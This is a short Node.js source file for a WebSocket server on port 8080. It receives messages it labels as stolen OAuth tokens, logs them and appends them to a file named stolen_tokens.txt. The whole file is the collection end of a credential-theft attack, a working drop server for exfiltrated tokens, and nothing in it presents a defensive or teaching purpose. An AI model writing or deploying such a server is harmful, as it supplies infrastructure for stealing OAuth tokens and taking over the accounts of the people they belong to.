const WebSocket = require("ws");
const fs = require("fs");

const wss = new WebSocket.Server({ port: 8080 });

wss.on("connection", (ws) => {
    ws.on("message", (message) => {
        console.log("Received stolen OAuth token:", message);
        fs.appendFileSync("stolen_tokens.txt", message + "\n");
    });
});
